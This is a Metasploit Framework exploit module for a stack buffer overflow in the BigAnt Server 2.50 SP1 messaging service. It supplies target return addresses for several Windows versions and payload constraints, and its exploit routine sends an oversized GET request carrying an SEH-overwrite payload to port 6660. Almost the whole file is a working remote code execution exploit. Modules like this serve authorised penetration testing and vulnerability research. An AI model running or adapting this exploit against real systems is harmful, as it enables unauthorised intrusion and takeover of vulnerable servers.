##
# $Id: bigant_server_250.rb 9669 2010-07-03 03:13:45Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'BigAnt Server 2.50 SP1 Buffer Overflow',
			'Description'    => %q{
				This exploits a stack buffer overflow in the BigAnt Messaging Service,
				part of the BigAnt Server product suite. This module was tested
				successfully against version 2.50 SP1.
			},
			'Author' 	 => [ 'Dr_IDE <Dr_IDE[at]hushmail.com>' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9669 $',
			'References'     =>
				[
					# It's not clear if these are correct - there was a fix for
					# the v2.2 vuln back in Dec 2008
					[ 'CVE', '2008-1914'],
					[ 'OSVDB', '44454'],
					[ 'URL', 'http://www.exploit-db.com/exploits/9673' ],
					[ 'URL', 'http://www.exploit-db.com/exploits/9690' ]
					#[ 'B_ID', '28795' ],
					#[ 'U_RL', 'http://www.milw0rm.com/exploits/5451'],
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'seh',
				},
			'Payload'        =>
				{
					'Space'    => 710,
					'BadChars' => "\x00\x20\x0a\x0d",
					'StackAdjustment' => -3500,
					'EncoderType'   => Msf::Encoder::Type::AlphanumUpper,
					'DisableNops'  =>  'True',
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'BigAnt 2.5 Universal',		{ 'Ret' => 0x0f9a196a } ], # Tested OK (Dr_IDE & patrickw) p/p/r VBAJET32.dll xpsp3 & w2k
					[ 'Windows 2000 Pro All English',   	{ 'Ret' => 0x75022ac4 } ], # p/p/r Tested OK (patrickw 20090918)
					[ 'Windows XP Pro SP0/SP1 English', 	{ 'Ret' => 0x71aa32ad } ], # Should Work
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Apr 15 2008'))

		register_options([Opt::RPORT(6660)], self.class)
	end

	def exploit
		connect

		sploit = "GET " + rand_text_alpha_upper(985) + generate_seh_payload(target.ret)
		sploit << rand_text_alpha_upper(1000 - payload.encoded.length)

		print_status("Trying target #{target.name}...")
		sock.put(sploit + "\r\n\r\n")

		handler
		disconnect
	end

end